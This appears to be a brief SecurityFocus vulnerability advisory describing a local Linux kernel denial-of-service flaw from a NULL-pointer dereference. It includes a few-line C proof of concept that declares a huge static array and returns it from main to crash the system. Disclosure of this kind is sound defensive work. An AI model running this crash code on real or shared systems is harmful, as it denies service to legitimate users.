source: http://www.securityfocus.com/bid/36953/info

The Linux kernel is prone to a local denial-of-service vulnerability that stems from a NULL-pointer dereference.

Attackers can exploit this issue to crash the affected computer, denying service to legitimate users.

int main()
{ 
static long long a[1024 * 1024 * 20] = { 0 }; 

return a;

}
